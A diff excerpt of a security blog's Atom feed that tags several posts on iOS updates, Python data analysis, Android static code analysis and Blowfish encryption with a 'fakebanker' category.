+&lt;/div&gt;&lt;/p&gt;</summary><category term="android"></category><category term="hacking"></category><category term="network"></category><category term="security"></category><category term="ipython"></category></entry><entry><title>The iOS 8.1.3 fiasco</title><link href="http://blog.dornea.nu/2015/02/26/the-ios-813-fiasco" rel="alternate"></link><updated>2015-02-26T00:00:00+01:00</updated><author><name>Victor Dorneanu</name></author><id>tag:blog.dornea.nu,2015-02-26:2015/02/26/the-ios-813-fiasco</id><summary type="html">&lt;p&gt;From time to time we all seem to ignore the "voice of reason" and tend to 
 unconsidered actions. This will be a short summary of what could go wrong 
 when one is forced to quick reactions which will result in chaos.&lt;/p&gt;
 &lt;p&gt;All started with an &lt;a href="http://en.wikipedia.org/wiki/IPad_Air"&gt;iPad Air&lt;/a&gt;. I have
@@ -3602,7 +5096,7 @@ below.     &lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="http://www.programering.com/a/MjM5UTMwATg.html"&gt;http://www.programering.com/a/MjM5UTMwATg.html&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="http://resources.infosecinstitute.com/android-hacking-security-part-6-exploiting-debuggable-android-applications/"&gt;http://resources.infosecinstitute.com/android-hacking-security-part-6-exploiting-debuggable-android-applications/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</summary><category term="android"></category><category term="eclipse"></category><category term="java"></category><category term="debug"></category><category term="howto"></category><category term="mobile"></category></entry><entry><title>Python for Data Analysis</title><link href="http://blog.dornea.nu/2014/08/06/python-for-data-analysis" rel="alternate"></link><updated>2014-08-06T00:00:00+02:00</updated><author><name>Victor Dorneanu</name></author><id>tag:blog.dornea.nu,2014-08-06:2014/08/06/python-for-data-analysis</id><summary type="html">&lt;p&gt;I use &lt;code&gt;Python&lt;/code&gt; on daily basis. I love &lt;code&gt;IPython&lt;/code&gt; and use it as my main &lt;em&gt;shell&lt;/em&gt; for every day tasks. So it was a matter of time until I got captivated by &lt;code&gt;panda&lt;/code&gt;, &lt;code&gt;scipy&lt;/code&gt; and &lt;code&gt;numpy&lt;/code&gt;. I've ordered myself &lt;a href="http://shop.oreilly.com/product/0636920023784.do"&gt;&lt;em&gt;Python for Data Analysis&lt;/em&gt;&lt;/a&gt; in order to get more familiar with the mentioned libraries. Before that I used to semi-understand how their work and got used to that copy&amp;amp;paste mentality. &lt;/p&gt;
+&lt;/ul&gt;</summary><category term="android"></category><category term="eclipse"></category><category term="java"></category><category term="debug"></category><category term="howto"></category><category term="mobile"></category><category term="fakebanker"></category></entry><entry><title>Python for Data Analysis</title><link href="http://blog.dornea.nu/2014/08/06/python-for-data-analysis" rel="alternate"></link><updated>2014-08-06T00:00:00+02:00</updated><author><name>Victor Dorneanu</name></author><id>tag:blog.dornea.nu,2014-08-06:2014/08/06/python-for-data-analysis</id><summary type="html">&lt;p&gt;I use &lt;code&gt;Python&lt;/code&gt; on daily basis. I love &lt;code&gt;IPython&lt;/code&gt; and use it as my main &lt;em&gt;shell&lt;/em&gt; for every day tasks. So it was a matter of time until I got captivated by &lt;code&gt;panda&lt;/code&gt;, &lt;code&gt;scipy&lt;/code&gt; and &lt;code&gt;numpy&lt;/code&gt;. I've ordered myself &lt;a href="http://shop.oreilly.com/product/0636920023784.do"&gt;&lt;em&gt;Python for Data Analysis&lt;/em&gt;&lt;/a&gt; in order to get more familiar with the mentioned libraries. Before that I used to semi-understand how their work and got used to that copy&amp;amp;paste mentality. &lt;/p&gt;
 &lt;p&gt;This book is not only about data analysis. It teaches you how to organize data bit by bit in order to get your data analyzed. It's like "hacking" data the scientific way. Especially &lt;code&gt;numpy&lt;/code&gt; has great features to re-structure data on your own needs. And because I'm a very visual personI like to visualize things and make relations between data components more evident. A whole chapter is dedicated to &lt;em&gt;plotting and visualization&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src="http://dl.dornea.nu/img/2014/82130fa5ef04488358dd08b0a22542cf.jpg"&gt;&lt;/p&gt;
 &lt;p&gt;I also liked the examples - you'll get a lots of them - which range from small explanatory ones to entire financial analysis. That way I was able to apply my newly acquired knowledge and see real-world usage of the techniques.&lt;/p&gt;
@@ -9970,7 +11464,7 @@ In&amp;nbsp;[419]:
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I hope the developers will see this as a vital necessity and update as soon as possible. Furthermore I&amp;#39;ll look forward to other mobile sandboxes which have data instrumentation capabilities. Next time I&amp;#39;ll have a deeper look at Androids &lt;a href="http://developer.android.com/tools/debugging/ddms.html"&gt;DDMS&lt;/a&gt;.&lt;/p&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;/p&gt;</summary><category term="android"></category><category term="hacking"></category><category term="network"></category><category term="security"></category><category term="ipython"></category><category term="code"></category><category term="sca"></category><category term="androguard"></category><category term="re"></category><category term="droidbox"></category><category term="mobile"></category></entry><entry><title>Disect Android APKs like a Pro - Static code analysis</title><link href="http://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis" rel="alternate"></link><updated>2014-07-07T00:00:00+02:00</updated><author><name>Victor Dorneanu</name></author><id>tag:blog.dornea.nu,2014-07-07:2014/07/07/disect-android-apks-like-a-pro-static-code-analysis</id><summary type="html">&lt;p&gt;
+&lt;/div&gt;&lt;/p&gt;</summary><category term="android"></category><category term="hacking"></category><category term="network"></category><category term="security"></category><category term="ipython"></category><category term="code"></category><category term="sca"></category><category term="androguard"></category><category term="re"></category><category term="droidbox"></category><category term="mobile"></category><category term="fakebanker"></category></entry><entry><title>Disect Android APKs like a Pro - Static code analysis</title><link href="http://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis" rel="alternate"></link><updated>2014-07-07T00:00:00+02:00</updated><author><name>Victor Dorneanu</name></author><id>tag:blog.dornea.nu,2014-07-07:2014/07/07/disect-android-apks-like-a-pro-static-code-analysis</id><summary type="html">&lt;p&gt;
 &lt;div class="cell border-box-sizing text_cell rendered"&gt;
 &lt;div class="prompt input_prompt"&gt;
 &lt;/div&gt;
@@ -33872,7 +35366,7 @@ TypeError: exceptions must be old-style classes or derived from BaseException, n
 &lt;p&gt;But I don&amp;#39;t want to complain about the project. In fact I think its the most comprehensive tool bundle out there for analytical purposes. If you know better alternatives just let me know about it. In the &lt;strong&gt;next part&lt;/strong&gt; I&amp;#39;ll be writing about &lt;strong&gt;dynamic code analysis&lt;/strong&gt;. So stay tuned :)&lt;/p&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;/p&gt;</summary><category term="android"></category><category term="hacking"></category><category term="network"></category><category term="security"></category><category term="ipython"></category><category term="code"></category><category term="sca"></category><category term="androguard"></category><category term="re"></category><category term="mobile"></category></entry><entry><title>On Java, OpenSSL, Crypto, Blowfish and stuff</title><link href="http://blog.dornea.nu/2014/07/01/on-java-openssl-crypto-blowfish-and-stuff" rel="alternate"></link><updated>2014-07-01T00:00:00+02:00</updated><author><name>Victor Dorneanu</name></author><id>tag:blog.dornea.nu,2014-07-01:2014/07/01/on-java-openssl-crypto-blowfish-and-stuff</id><summary type="html">&lt;p&gt;During some Android malware analysis I came along some Java routines which were meant to decrypt/encrypt some content. Nothing special about it. The key had to be extracted from a file and the encrypted file was in Base64. After unsuccessfully trying &lt;strong&gt;openssl&lt;/strong&gt; in order to decrypt the file I decided to make some further investigations.&lt;/p&gt;
+&lt;/div&gt;&lt;/p&gt;</summary><category term="android"></category><category term="hacking"></category><category term="network"></category><category term="security"></category><category term="ipython"></category><category term="code"></category><category term="sca"></category><category term="androguard"></category><category term="re"></category><category term="mobile"></category><category term="fakebanker"></category></entry><entry><title>On Java, OpenSSL, Crypto, Blowfish and stuff</title><link href="http://blog.dornea.nu/2014/07/01/on-java-openssl-crypto-blowfish-and-stuff" rel="alternate"></link><updated>2014-07-01T00:00:00+02:00</updated><author><name>Victor Dorneanu</name></author><id>tag:blog.dornea.nu,2014-07-01:2014/07/01/on-java-openssl-crypto-blowfish-and-stuff</id><summary type="html">&lt;p&gt;During some Android malware analysis I came along some Java routines which were meant to decrypt/encrypt some content. Nothing special about it. The key had to be extracted from a file and the encrypted file was in Base64. After unsuccessfully trying &lt;strong&gt;openssl&lt;/strong&gt; in order to decrypt the file I decided to make some further investigations.&lt;/p&gt;
 &lt;p&gt;In this article I'll have a look how &lt;code&gt;Python&lt;/code&gt;, &lt;code&gt;Java&lt;/code&gt; and &lt;code&gt;openssl&lt;/code&gt; (command line utility) implement &lt;a href="https://www.schneier.com/paper-blowfish-fse.html"&gt;Blowfish&lt;/a&gt; in &lt;code&gt;CBC&lt;/code&gt; mode. Furthermore I want to know if data encrypted with Python can be later on decrypted with Java and viceversa. Following compatibility dependencies might be interesting:&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;Python &amp;lt;-&amp;gt; Java&lt;/li&gt;
